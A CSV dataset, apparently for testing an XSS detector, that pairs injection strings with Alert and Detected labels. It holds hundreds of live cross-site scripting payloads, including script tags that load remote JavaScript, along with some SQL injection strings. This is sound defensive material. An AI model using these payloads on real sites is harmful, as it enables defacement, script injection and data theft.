Payload,Alert,Detected
searchtype=t&searcharg=%22%3Cmarquee%3E%3Ch1%3ESTITCHUP%3C%2Fh1<br/>%3E%3C%2Fmarquee%3E&searchscope=6&SORT=D&extended=0&SUBMIT=Search&searchlimits=&searchorigarg=t%3Cma<br/>rquee%3E%3Ch1%3ESTITCHUP%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
bannerid=26&zoneid=1&s&zoneid=41&source=&dest=http://se<br/>ymen.org,False,0
email=%22%3E%3Ch1%3EDING%20DING%20DING%20DING<br/>%20DING%20DING%3C/h1%3E%3Cimg%20src=//www.gamgea.com/wp-content/uploads/2010/06/retro-mario-in-3d-fl<br/>avor.gif%3E,False,0
"page=companies&id=1446&name=""><iframe%20src=http://hotturks.org/<br/>>",False,0
longstay_id=1'%3E%22%3E%3Ciframe%20src=http://kusomis<br/>o.com/xss.html%20%3C,False,0
lid=18&tid=1&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code<br/>%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
eid=3088855&url=http://www.google.com,False,0
Submit=Get%20Pagerank&url=%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
"=a=document.domain;top[""al""%2b""ert""](/%2a%2a/a)>",False,0
"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D""/>",False,0
guestbook=2864,False,0
"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=print()></dt>",False,0
oaparams=2__bannerid=742__zoneid=8__cb=77202f4dba__oadest<br/>=http://st2tea.blogspot.com,False,0
id=,False,0
onPause,False,0
"url=XSS.jpg""><iframe%20src=../></iframe>",False,0
&#X003C,False,0
"location=""http://html5sec.org"";",False,0
s=mp3%20indir&c=%22%3E%3Ciframe%20src=http://crackertrex.li/%3E,False,0
CreateDocument,False,0
name=Search,False,0
url=http://kusomiso.com/'%3E%22%3E%3C/script%3E%3CSC<br/>RIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E,False,0
onSelectionChange,False,0
ontouchend,False,0
debug=1,False,0
"discuss=<iframe src=""http://xssed.com"">",False,0
"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",False,0
"gall_id=1&show_user=99%20union%20select%201,2,3,4,5,0x273c736372<br/>6970743e616c657274282258535322293b3c2f7363726970743e27%20--",False,0
Reflect.apply.call`${alert}${undefined}${[23]}`,False,0
url=http://data.xssed.org/images/xssed_logo.gif,False,0
action=auth&returnpage=%3C/SCRIPT%3E%22%3E%27%3E%3C/SCRIPT%3E%3CSCRIP<br/>T/XSS%20SRC=%22http://ha.ckers.org/xss.js%22%3E,False,0
"<;SCRIPT a="";>;""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",False,0
pageID=ny<br/>c_blue_room&catID=1194&doc_name=http://www.google.com&cc=unused1953&rc=1194&ndi=1,False,0
url=http://www.geocities.com/pinkelephant2k7/stallowned.html,False,0
vgnextoid=c813055209b8c010VgnVCM1000002f2af90a<br/>RCRD,False,0
page=music&section=view&mus_id=100032,False,0
affiliate=6895&redirectto=http://insecurity.ro,False,0
"mode=search&srch=>""><BR><font%20size=99>XSSed%20yourself!!!</<br/>font><a",False,0
"secim=<iframe%20src=""http://www.xssed.com/archive/a<br/>uthor=TurKPoweR/"">",False,0
"Cat=111-222-1933email@address.com&Pagina=%3Cimg%20src=""htt<br/>p://img73.imageshack.us/img73/5382/antifa20italiano20lz.jpg""%3E",False,0
"/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)",False,0
idcat=109,False,0
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=print()></abbr>",False,0
onplaying,False,0
u=http://www.theshockboy.tr.cx,False,0
_t=%22%3E%3Ci<br/>frame%20src=%22http://xssed.com%22%3E,False,0
"<style>:target {color: red;}</style><input2 id=x style=""transition:color 10s"" ontransitioncancel=print()></input2>",False,0
q=aHR0cDovL3NpZ251cC5teXNwYWNlLmNvbS9pbmRleC5jZm0%2FZnVzZWFjdGlvbj1qb2<br/>luJk15VG9rZW49NmY2MzNjYjQtMmZiMi00YTZmLThjYzgtYjkzNDAxMGJhZjdlIj48c2NyaXB0PmFsZXJ0KCJhc2RmIik8L3Njcm<br/>lwdD4%3D&hl=0,False,0
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=print()></a>",False,0
onKeyPress,False,0
btnI&q=http://www.yahoo.com,False,0
mid=90&uid=1&url=http%3A%2F%2Fwww.xssed.com%2F,False,0
option=com_content&user_rating=1&submit_vote=index2.ph<br/>p?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&ur<br/>l=http://toradiun.com,False,0
"alias=""><img<br/>src=""http://img61.imageshack.us/img61/4632/26vrul2.jpg"">",False,0
video=bush_got_arrested&h=%68%74%74%70%3A%2F%2F%77%77%77%2E%6D<br/>%6F%7A%69%6C%6C%61%2E%63%6F%6D%2F%65%6E%2D%55%53%2F%66%69%72%65%66%6F%78%2F,False,0
Cid=53&coname=&coname=%3Cifr<br/>ame%20src=%22http://xssed.com%22%3E,False,0
i=7&r=http://www.google.com,False,0
articleid=476,False,0
passthru=http://google.com&email=asdtestf@asdf.c<br/>om&action=new&firstname=asdf&lastname=asdf&password=asdfasdf&password2=asdfasdf&company=asdf&phone=&<br/>position=Computer+User&Country=USA&resellerid=1&comments=,False,0
page=<h1>XSS%20FLAW<comment>,False,0
"<div id=""66""><?xml version=""1.0""?>",False,0
id=http://xssed.com/,False,0
pt=2&sp=2&vid=12059<br/>64443_5X02X22612833&rpt=1&kt=1,False,0
"AnonKryptiQuz?,prompt%0A/*HelloWorld*/(document.domain)",False,0
"page=insanhaklari&file=""><iframe src=//xssed.com>",False,0
ui=7405476966D2482FA8085B<br/>B5DC76407B,False,0
id=11541&tagname=bullet_10_1A&redir=http://www.xssed.com,False,0
id=2907,False,0
catid=12183&state=20&register=true,False,0
"q=</script><iframe src=""http://xssed.com""></iframe>",False,0
<iframe src=http://xss.rocks/scriptlet.html <,False,0
q=aHR0cDovL3d3dy5nb29nbGUuY29tLmFyLz9xPVwiIG9ubW91c2VvdmVyPWFsZXJ0<br/>KC9DMWM0VHIxWi8uc291cmNlKT4=,False,0
query=%3Cfont+size%3D100%3Egurus%3Cmarquee%3E+hacking-gu<br/>rus+%3C%2Fmarque%3E,False,0
qs=%22%3E%3E%3E%3E%3Ciframe+src%3D%22http://ha.cker<br/>s.org/xss.jpg%22,False,0
target=http://lht.by.ru/uyar1.html,False,0
"<SCRIPTSRC=""http://xss.rocks/xss.jpg""></SCRIPT>",False,0
page=contactus&processed=true,False,0
</h2>,False,0
"<style>:target {color: red;}</style><small id=x style=""transition:color 10s"" ontransitioncancel=print()></small>",False,0
month=3&day=9&year=2007%22%3E%3Cstyle%3E%3Cmarquee%3Ehackedbycyber-hell.org{ha<br/>ckedbycyber-hell.org,False,0
authority=a4&lan<br/>guage=sv,False,0
q=%22%3E%3Cimg%20src=%22http://img152.imageshack.us/img152/7<br/>032/xssximagesd8.jpg%22%3E,False,0
"act=search&search=""><img<br/>src=""http://img96.imageshack.us/img96/8009/xssks5.jpg"">",False,0
<x%2Fonxxx=1,False,0
searchterm=%22%3E%3Cimg+src%3Dhttp%3A%2F%2Fi48<br/>.tinypic.com%2Fdw5dkz.png%3E%3C%2Fimg%3E%3C%22,False,0
"""import"" href=""test.svg"" />",False,0
s=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
destURL=www.xssed.com,False,0
"&lt;OBJECT TYPE=\""text/x-scriptlet\"" DATA=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/OBJECT&gt;",False,0
q=%22%3E%3Ch1%3EXSS+by+C1c4Tr1Z!%3Ch1%3E%3Ci<br/>frame+src%3Dhttp%3A%2F%2Fxssed.com%2F%3E%3C%2Fiframe%3E&sa=Buscar&cx=003915066760898590818%3Abfbpb70<br/>pe3u&cof=FORID%3A11,False,0
destino=%22%3E%3C/script%3E%3Ciframe%20src=%22http://xssed<br/>.com%22%3E,False,0
url=http://jonnycake.kicks-ass.net/hack.html,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3ENu<br/>ll%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"nID=is_ssl=""><b><i><center>HackeD%20by%20immortalislam",False,0
<svg/onload​=alert&sol;**&sol;(3)>,False,0
topic=registerv2%2Fstep2,False,0
&#X03C;,False,0
msg=%3CIFRAME%20WIDTH=960%20HEIGHT=400%20SRC=//google<br/>.com%3E,False,0
"prgID=17&ktgID=is_ssl=""><b><i><center>HackeD%20by%20immortalislam",False,0
"<div id=""98""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div>",False,0
"t=browseTab&ft=browseTab&opentopic=20009&topicName=xss"");a<br/>lert('www.aroundthebox.org pwnz<br/>2');a(""&topicTreeId=null&showcontent=true&lstLanguageResults=en_US&locale=en_US&_dyncharset=UTF-8&cm<br/>d=_help-ext",False,0
url=seymen.org,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_co<br/>ntent&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.<br/>com,False,0
u=http://www.owasp.org/index.php/Open_redirect,False,0
tempno=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
division=aG5ld3M=,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_<br/>content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xsse<br/>d.com,False,0
a=newpassword,False,0
page=08&sortt=%22%3E%3Cimg%20src=http://i48.tinypic.com/dw5dk<br/>z.png%3E%3C/img%3E%3C%22,False,0
<iframe src=http://.rocks/scriptlet.html <,False,0
q=<marquee><font size=5<br/>color=red>LeBaNeSe-XsSeR</marquee></font>&x=0&y=0,False,0
lang=ru&issue='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cb<br/>r%3E%3Cbr%3E%3Cmarquee%3EWhiteHat%20Forever%3C/marquee%3E&print=true,False,0
Search,False,0
page=search&page_id=1,False,0
ondrag,False,0
appId=appCSPrepay_2G%22%3E%3Ciframe%20src=<br/>http://www.xssed.com%3E,False,0
p=Search,False,0
loc=693,False,0
palavra=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>,False,0
main_page=product_info&products_id=190%3A96e73378d33e09c95b37ce90<br/>45069379&number_of_uploads=0&action=add_product,False,0
q=\%22%3E%3Ciframe%20src=%22http://serdar00795.sitemyne<br/>t.com/hacked.html%22%20width=900%20,False,0
rempli=oui&b_nat=on&id_reg=&mot_cle=&titre=%22%3E%27%3E%3CS<br/>CRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&publi=<br/>&ok=Rechercher&num_pub=&deb_mois=&deb_annee=&fin_mois=&fin_annee=&auteur=,False,0
onauxclick,False,0
p=--%3E%3C/title%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironz<br/>org%3C/h1%3E%3C/marquee%3E,False,0
url=http://eren.boratasarim.net/index2.html,False,0
\”}})})-confirm`AnonKryptiQuz`;(function(){({if(){/*///,False,0
s=26&c=339&w=1&h=1&url=http://r3t.n3t.nl,False,0
<a href=ja%26Tab%3bvasc%26Tab%3bript:prompt`AnonKryptiQuz`>pwn</a>,False,0
lnk=http://vuln.xssed.net/thirdparty/scripts/python5.h<br/>tml,False,0
"langue=fr&t2003=and&t2020=10&t2002=dd&t2005=a<br/>nd&t2004=<iframe+height%3D""999""+width%3D""999""+src%3D""http%3A%2F%2Fxssed.com%2F"">&t2015=or&t2014=<ifr<br/>&t2016=<ifr&t2009=and&t2011=and&recherche=RECHERCHER&t2040=&t2041=",False,0
"<;A HREF="";//www.google.com/"";>;XSS<;/A>;",False,0
as=rstzone.org&od=rstzone.org,False,0
Email=%22%3E%3Cimg%20src%3D%22http%3A%2F%2F365c<br/>h.com%2Fw4r3z%2Fsize3%2F1279341305_0.jpg%22%3E,False,0
FirstName=%22%3E%3Ciframe%20src%3D%22http://www.baseport<br/>al.com/baseportal/bankphish/_XSS%22%3E%3C/iframe%3E&LastName=&submit=Submit+Values,False,0
"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=print()></menu>",False,0
lang=en&cat='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E<br/>%3Cmarquee%3EWhiteHat%20Forever%3C/marquee%3E,False,0
"<object+data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",False,0
keywords=%22%3E%3Cmarquee%3EXSSed%3C/marquee%3E,False,0
url=r3t.n3t.nl,False,0
"<A HREF=""http://1113982867/""></A>",False,0
id=1&url=http%3a%2f%2fxssed.com,False,0
info=.htaccess%3Ciframe%20src=http://xssed.com/%3E&acti<br/>on=edit&osCAdminID=cbfe8cb6efd504f0edfda0908fd5082c,False,0
searchword=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3E<br/>cueballr%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E&x=44&y=5,False,0
onMouseOut,False,0
"<A HREF=""http://google:ha.ckers.org""></A>",False,0
"This works the same as above, but uses a<STYLE>tag instead of a<LINK>tag). A slight variation on this vector was used
to hack Google Desktop. As a side note, you can remove the end</STYLE>tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:",False,0
st=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C%2Fst<br/>rong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
mhtml:http://html5sec.org/test.html!xss.html></iframe>,False,0
"&lt;A HREF=\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\""&gt;AnonKryptiQuz&lt;/A&gt;",False,0
fuseaction=events&Mytoken=x,False,0
field_command=create_group_submit&group_name=&tags=%22%3E%3Cscr<br/>ipt/src=http://h4k.in/j.js%3E&description=&short_name=&group_categories=2&group_categories=23&group_<br/>categories=24&group_categories=1&group_categories=20&group_categories=26&group_categories=10&group_c<br/>ategories=25&group_categories=22&group_categories=15&group_categories=17&group_categories=19&group_t<br/>ype=public&group_type=private_owner_approval&group_type=private_owner_invite&video_upload_type=immed<br/>iate&video_upload_type=owner_approve&video_upload_type=owner_only&forum_upload_type=immediate&forum_<br/>upload_type=owner_approve&forum_upload_type=owner_only&group_icon=automatic&group_icon=custom&Submit,False,0
URL=http://www.hackingisnotacrime.com/hacking_def<br/>ined.php,False,0
lid=fr&tid=aleborg&f_user=&six=&f_email==%22%3E%3Ch1%3ENul<br/>l%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=print()></iframe>",False,0
docid=%22%3E%3Ciframe%20src=/%3E%3C/iframe%3E,False,0
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//,False,0
SearchText=%3Ciframe%20src=%22http://amsecure.blogspot.com%22i,False,0
account=heloti&optr=2&def=%22%3E%3Ciframe%20src=http://pc-k<br/>opat.us/hacked/%3E,False,0
s=%3Ciframe+src%3D%22http%3A%2F%2Finsecurity.ro%22%3E&searchbut<br/>ton=Go!,False,0
"Q2=&Q=durr""//--></script><iframe src="""">&F=sv&T=fr",False,0
q=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURITY+BY+CHERO<br/>KEE+WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E++&btnG=Google+Search&site=buffalostate&output=xml_no_dtd&clie<br/>nt=buffalostate&proxystylesheet=buffalostate,False,0
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=print()></strong>",False,0
api_key=d986f51fdd54acd4b26ccec75056aa25&v=1.0&next=http://xssed<br/>.com&app_ref=new_feed,False,0
"q=""><marquee><h1>Hacked%20By%20Dark.Man</h1></marquee>",False,0
do=search,False,0
"<;!--#exec cmd="";/bin/echo ';<;SCRIPT SRC';"";-->;<;!--#exec cmd="";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';"";-->;",False,0
id_forum=72189&id_menu=245549,False,0
onmessage,False,0
query=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E&portal=noti<br/>cias,False,0
Type=StudyName&StudyName=%22%3E%3Ciframe%20src%3Dhtt<br/>p://www.baseportal.com/baseportal/bankphish/_XSS%3E%3C/iframe%3E&TypeOfSearch=Contain&StudyDateStart<br/>=&StudyStatus=&StudyQAAssessmentLevel=&StudyQALevel=1&wria_id_nr=&county_code_nr=&RecordsPerPage=100<br/>&StudySortColumn=IDENTIFICATION_CD&RecordPage=1,False,0
codigo=%3CH1%3EVulnerabili<br/>dade%20XSS%20%3Ciframe%20src=http://www.xssed.com%3E%3C/iframe%3E,False,0
"=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029",False,0
cmd=_sitewide-search,False,0
onOutOfSync,False,0
option=com_content&user_rating=1&submit_vote=index2.p<br/>hp?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&u<br/>rl=http://www.xssed.com,False,0
go=reg2,False,0
q=%22%3E%3Ch1%3EHacked+By+Dialogitec+ImeCiQ%3C%2Fh1%3E%3C%21--,False,0
search_field=%22%3E%3Ch1%3E%3Cmarquee%3E---+<br/>XSSED+---%3C%2Fmarquee%3E%3C%2Fh1%3E&Search=Search,False,0
\u003C,False,0
http://xssed.com,False,0
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",False,0
vid=MTI5OQ==&vcode=<iframe<br/>src=http://www.google.com></iframe>,False,0
"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=print()></datalist>",False,0
onmousemove,False,0
sa=l&ai=BAxMGMmb2RZGiMJ-YgwP45dT_C4aA8hmGxtzBA8CNtwHA_BUQARgBIOW3j<br/>gMoAzAAOABQwq7eugZgkYSThfwXmAHmxo4moAHG1LH-A6oBH3NnaG12aWV3K3B1YmxpYytub25hZHVsdCt1c2VuZXTIAQHaATIvZ<br/>3JvdXAvbW96aWxsYS5kZXYuZXh0ZW5zaW9ucy90b3BpY3M_c3RhcnQ9MTAmc2E9TqgDAQ&num=1&adurl=http://www.disney.<br/>com,False,0
"id=""><META%20HTTP-EQUIV=Refresh%20CONTE<br/>NT=0;URL=http://www.xssed.com/>",False,0
"burc=11&tr=""><img<br/>src=""http://img61.imageshack.us/img61/4632/26vrul2.jpg"">",False,0
search=true&q=%27%22%3E%3Ch1%3ERubberDuck%3C%2Fh1%3E%3Cbr%3E<br/>%3Cbr%3E%3Cmarquee%3EWhiteHat+Forever%3C%2Fmar&forums=-1&range=10,False,0
"&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;",False,0
pt=2&sp=2&vid=12026<br/>33162_1X04X1667932557&rpt=2&kt=1,False,0
id=464&categoria=SolucionesDatacenter&servicio=%22%3E%3Ci<br/>frame%20src=%22http://.xssed.com%22%3E,False,0
"<img id=xss src=""livescript:[code]"">",False,0
account=heloti&optr=%22%3E%3Ciframe%20src=http://pc-kopat.u<br/>s/hacked/%3E,False,0
url=http://www.geocities.com/pinkelephant2k7/owned.ht<br/>ml,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_<br/>content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com,False,0
"<div id=""90""><!-- Up to Opera 10.63 -->",False,0
"lan=2&uid=XDD""></form><iframe%20src=http://www.google.com></iframe><&p<br/>id=65",False,0
cadre=%27%22%3E%3C<br/>marquee%3EXSS%3Ciframe%20src=%27http://xssed.com%27/%3E&desturl=%2Fworld%2Fcommunaute%2Falbum%2Falbp<br/>aram.asp%3Ftodo%3Dcreate&msg=MonAlbum,False,0
FuseAction=Search.Results&CFId=34906562&CFToken=88040980&Key<br/>words=%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E%3Cmarquee%3E%3Ch1%3EXS<br/>S+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&Submit=Submit,False,0
"<div style=""font-family:foo}color=red;"">XXX",False,0
sid=b8c25e351049c3890699fa8e8aae1c73,False,0
tid=default&lid=pt_BR&error==%22%3E%3Ch1%3ENull%20Cod<br/>e%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"<style>:target {color: red;}</style><blink id=x style=""transition:color 10s"" ontransitioncancel=print()></blink>",False,0
redirect=http://google.it,False,0
URL=http://nullflow.com/xss/xss.php,False,0
onbegin,False,0
articleid=397,False,0
setTimeout('ale'+'rt(2)');,False,0
bannerid=35&zoneid=0&source=&dest=http://xssed.com/,False,0
textfield=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&Submit2=Busca<br/>r,False,0
cat=%22%3E%3Ciframe%20src=http://hypnozhack.org/hacked/%3E,False,0
largeimg=><iframe%20src=http://www.google.com></iframe><,False,0
pollId=qe5zen49gsgyzk3h&adminKey=&participantKey=,False,0
&lt;/BODY&gt;&lt;/HTML&gt;,False,0
id='%22%3E%3Ciframe%20src=http://pc-kopat.us/<br/>hacked/%3E,False,0
Catchword=%22%20style=%22-moz-binding:ur<br/>l(http://milch.schokokeks.org/~lars/xss/username.xml%23username),False,0
http://kusomiso.com,False,0
url=http://www.barackobama.com/about/,False,0
&lt;dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt%2Ca(origin)%20x&gt;,False,0
&#X0003c,False,0
q=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E,False,0
mxr=http://www.google.com&tpt=islamic,False,0
query='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3C<br/>br%3E%3Cmarquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
paketid=2&plan=%3Ciframe%20src=%22http://experlizm.com%22%3E,False,0
"<a href='vbscript:MsgBox(""Successful AnonKryptiQuz"")'>Click here</a>",False,0
"Keywords=</title>""></a><iframe src=http://google.com></iframe>",False,0
timezone=aaaa%3Ciframe/src%3D//xssed.com%3E,False,0
</BODY></HTML>,False,0
key=%3Ciframe+src%3D%22http%3A%2F%2Fbbs.kafan.cn%22%3E%3C%2Fiframe<br/>%3E&type=22,False,0
"'>//\\,<'>"">"">""*""",False,0
v=info&viewas=1,False,0
catpg=%22%3EI%20hacked%20this%3C/option%3E,False,0
desc=&site=http://www.r3t.n3t.nl&pos=0&url<br/>=http%3A%2F%2Fr3t.n3t.nl%2Fclick.phtml%3Fdata%3DbGs9MTg1NDQzNjQwMiZwaz0zMTYmaXA9NjIuMTUwLjYuMiZ0cz0x<br/>MTk5NjEwMjYzJnVxaz1kSEp6TWpjdVpXMHVjbVUwTG5saGFHOXZMbU52YlRRM09EQTVPVGszWTJKaVpHTT0-%26sig%3DMWM0NmM<br/>4MDM2NzQ1N2M0YWE0NGY4NTkyZGJkMDNkNTJkMWYzZDEzYw--,False,0
search=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3E%3Ci%3Ecueba<br/>llr%3C%2Fi%3E%3C%2Fstrong%3E%3C&x=0&y=21,False,0
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,False,0
onInput,False,0
kala=0601039&time_code=%22%3E%3Ciframe%20src=http://hypnozhack<br/>.org/hacked/%3E,False,0
onstart,False,0
event=cuteemail_results&next=http://r3t.n3t.nl,False,0
iniletter=%22%3E%3Cimg%20src=%22http://img152.imageshack.us<br/>/img152/7032/xssximagesd8.jpg%22%3E,False,0
item=atualidades&link=http://xssed.com,False,0
Capno=%3Cmarquee%3Exss%3C/marquee%3E,False,0
"<style>:target {color: red;}</style><custom tags id=x style=""transition:color 10s"" ontransitioncancel=print()></custom tags>",False,0
s=89cb51d2cf33c8c677edd54214b033ef,False,0
"pl=1</script><iframe%20src=""http://xssed.com"">&sessionno=<br/>0",False,0
bannerid=173&zoneid=1&s&zoneid=41&source=&dest=http://seymen.org,False,0
searchFor=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueball<br/>r%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E&mediaType=video&searchBy=text&Submit=Search,False,0
href=http://xssed.com,False,0
cx[][][][][][][][][][][][][][][][][][][][][][][]<br/>[][][][][][][][%20][][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
r=%22%3E%3Ciframe%20src=http://pc-kopat.us/hack<br/>ed/%3E,False,0
q=<center><h1>XSSED by SPYRO KiD<br><a<br/>href=http://spyrozone.net>http://spyrozone.net</a></h1><br><iframe width=800 height=400<br/>src=http://spyrozone.net></iframe><noscript>,False,0
qscr=redr&rurl=http://s5.tinypic.com/2pzcgty.jpg,False,0
CREF2=379&KID=691000&flugdauer=42%22%3E%3Cul%20style=mar<br/>gin-left:500px%3E%3Cli%20style=list-style:url(http://s5.tinypic.com/2pzcgty.jpg)%3E%3C/ul%3E&termin=<br/>1230805955&te_g=1&ruecktermin=1238450400&rute_g=1&kategorie=2&verpflegung=1&zimmer=-1&sportmoeglichk<br/>eiten=-1&wellness=0&zielgebiets_kenner=34&uthema=1_12&dauer=6_2&personen=25;25;;;;;&anzahl_treffer_s<br/>eite=&Laender_Ref_ID=999_10_GE80&engine=erde&formular=2&nSTART=3&marke=TOC&&detail=termine&showresul<br/>t=1&startposition_hotel=0&startposition=0&zielgebiets_kenner=34&IFF=37673,False,0
action=url&goto=uber0n.darkillusion.org/xsspage.htm,False,0
query=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr<br/>%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E&topic=&author=&days=30,False,0
q=%22%3Cimg%20src%3D%22http://133.anche.no/wp-content/uploads/<br/>2008/10/volantino-serata-2-1.jpg%22%20/%3E,False,0
Fuseaction=Search.Home&searchtext=%27%22%3E%3Cmarquee%3E%3C<br/>h1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fma<br/>rquee%3E&x=14&y=7,False,0
ref=http://lht.by.ru/uyar1.html,False,0
"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",False,0
q=script+alert,False,0
onBeforeCopy,False,0
codigo=POR&pagina=http://www.xssed.com,False,0
lang=es&s=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%3E,False,0
